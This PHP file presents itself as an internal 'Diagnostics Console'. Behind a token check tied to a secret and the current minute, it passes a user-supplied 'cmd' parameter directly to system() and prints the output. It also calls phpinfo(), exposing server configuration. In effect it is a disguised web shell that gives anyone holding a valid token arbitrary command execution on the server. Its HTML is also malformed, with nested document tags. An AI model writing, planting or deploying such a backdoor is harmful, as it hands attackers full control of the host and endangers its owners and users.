<?php
require '../../../vendor/autoload.php';
use Dotenv\Dotenv;

$dotenv = Dotenv::createImmutable(__DIR__ . '/../../../');
$dotenv->load();
putenv("JWT=" . $_ENV['JWT']);
$secretKey = getenv('JWT');

function getSecret($secretKey, $timestamp) {
    return hash('sha256', $secretKey . gmdate('YmdHi', $timestamp));
}

$token = $_GET['token'] ?? '';
$timestamp = $_GET['ts'] ?? '';

if (!$token || !$timestamp) {
    http_response_code(403);
    exit('Missing token or timestamp');
}

if (abs(time() - (int)$timestamp) > 300) {
    http_response_code(403);
    exit('Token expired — must be within 5 minutes of error event');
}

$expected = getSecret($secretKey, (int)$timestamp);

if (!hash_equals($expected, $token)) {
    http_response_code(403);
    exit('Invalid token — must be generated for the *exact minute* when the error occurred');
} ?>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Diagnostics Console</title>
<style>
  :root {
    --bg: #000;
    --panel: #0a0a0a;
    --fg: #0f0;
    --border: #0f0;
    --accent: #ff0;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0;
    background: var(--bg);
    color: var(--fg);
    font-family: monospace;
    padding: 2rem;
  }
  .wrap {
    max-width: 900px;
    margin: 0 auto;
  }
  h1 {
    border-bottom: 1px solid var(--border);
    padding-bottom: .5rem;
    margin-bottom: .25rem;
  }
  .subtitle {
    color: #0a0;
    margin: 0 0 2rem;
    font-size: .9rem;
  }
  .panel {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 1.5rem;
    margin-bottom: 1.5rem;
    box-shadow: 0 0 20px #0f0a;
  }
  label {
    display: block;
    margin-bottom: .35rem;
    font-size: .85rem;
    color: #0c0;
  }
  .row {
    display: flex;
    gap: 1rem;
    margin-bottom: 1rem;
    flex-wrap: wrap;
  }
  .row > .field { flex: 1; min-width: 180px; }
  select, input, textarea {
    width: 100%;
    background: #111;
    color: var(--fg);
    border: 1px solid var(--border);
    border-radius: 4px;
    padding: .6rem;
    font-family: monospace;
    font-size: .9rem;
  }
  textarea { resize: vertical; min-height: 110px; }
  .url-preview {
    background: #111;
    border: 1px dashed var(--border);
    border-radius: 4px;
    padding: .6rem;
    font-size: .8rem;
    color: var(--accent);
    word-break: break-all;
    margin-bottom: 1rem;
  }
  .actions {
    display: flex;
    gap: 1rem;
    align-items: center;
  }
  button {
    background: var(--fg);
    color: #000;
    border: none;
    border-radius: 6px;
    padding: .6rem 1.4rem;
    font-weight: bold;
    font-family: monospace;
    cursor: pointer;
    box-shadow: 0 0 10px #0f0a;
  }
  button.secondary {
    background: transparent;
    color: var(--fg);
    border: 1px solid var(--border);
    box-shadow: none;
  }
  .status {
    font-size: .85rem;
    color: #0a0;
  }
  .response {
    background: #050505;
    border: 1px solid var(--border);
    border-radius: 6px;
    padding: 1rem;
    min-height: 160px;
    max-height: 420px;
    overflow: auto;
    white-space: pre-wrap;
    word-break: break-word;
    font-size: .85rem;
    margin: 0;
  }
  .response:empty::before {
    content: "// response will appear here";
    color: #0a0;
  }
</style>
</head>
<body>
<div class="wrap">

  <h1>Diagnostics Console</h1>
  <p class="subtitle">Internal debugging tool — signed requests valid for 5 minutes.</p>

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="hidden" name="token" value="<?php echo htmlspecialchars($_GET['token'] ?? '', ENT_QUOTES); ?>">
<input type="hidden" name="ts"    value="<?php echo htmlspecialchars($_GET['ts'] ?? '', ENT_QUOTES); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>

<?php
phpinfo();
?>